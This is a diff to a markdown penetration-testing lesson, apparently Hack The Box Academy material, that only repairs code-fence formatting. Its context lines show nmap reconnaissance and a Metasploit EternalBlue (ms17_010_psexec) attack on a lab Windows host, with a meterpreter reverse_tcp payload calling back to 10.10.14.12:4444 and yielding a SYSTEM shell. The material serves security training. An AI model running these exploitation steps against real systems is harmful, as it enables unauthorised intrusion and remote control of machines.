@@ -38,8 +38,7 @@ Since we have a set of targets, `what are a few ways to determine if the host is
 
 #### Pinged Host
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ ping 192.168.86.39 
 
 PING 192.168.86.39 (192.168.86.39): 56 data bytes
@@ -55,8 +54,7 @@ If you run into issues and the scans turn up little results, attempt again with 
 
 #### OS Detection Scan
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo nmap -v -O 192.168.86.39
 
 Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 17:40 EDT
@@ -97,8 +95,7 @@ Now that we know we are dealing with a Windows 10 host, we need to enumerate the
 
 #### Banner Grab to Enumerate Ports
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo nmap -v 192.168.86.39 --script banner.nse
 
 Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 18:01 EDT
@@ -189,8 +186,7 @@ Ping, Netcat, Nmap scans, and even Metasploit are all good options to start enum
 
 #### Enumerate the Host
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ nmap -v -A 10.129.201.97
 
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 18:13 EDT
@@ -249,8 +245,7 @@ Open `msfconsole` and search for EternalBlue, or you can use the string in the s
 
 #### Determine an Exploit Path
 
-```
-        shellsession
+```shellsession
 msf6 auxiliary(scanner/smb/smb_ms17_010) > use auxiliary/scanner/smb/smb_ms17_010 
 msf6 auxiliary(scanner/smb/smb_ms17_010) > show options
 
@@ -288,8 +283,7 @@ Now, we can see from the check results that our target is likely vulnerable to E
 
 #### Choose & Configure Our Exploit & Payload
 
-```
-        shellsession
+```shellsession
 msf6 > search eternal
 
 Matching Modules
@@ -309,8 +303,7 @@ For this instance, we dug through MSF's exploit modules utilizing the search fun
 
 #### Configure The Exploit & Payload
 
-```
-        shellsession
+```shellsession
 msf6 > use 2
 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
 msf6 exploit(windows/smb/ms17_010_psexec) > options
@@ -353,8 +346,7 @@ Be sure to set your payload options correctly before running the exploit. Any op
 
 #### Validate Our Options
 
-```
-        shellsession
+```shellsession
 msf6 exploit(windows/smb/ms17_010_psexec) > show options
 
 Module options (exploit/windows/smb/ms17_010_psexec):
@@ -397,8 +389,7 @@ This time, we kept it simple and just used a `windows/meterpreter/reverse_tcp` p
 
 #### Execute Our Attack
 
-```
-        shellsession
+```shellsession
 msf6 exploit(windows/smb/ms17_010_psexec) > exploit
 
 [*] Started reverse TCP handler on 10.10.14.12:4444 
@@ -423,8 +414,7 @@ Success! We have landed our exploit and gained a shell session. A `SYSTEM` level
 
 #### Identify Our Shell
 
-```
-        shellsession
+```shellsession
 meterpreter > shell
 
 Process 4844 created.
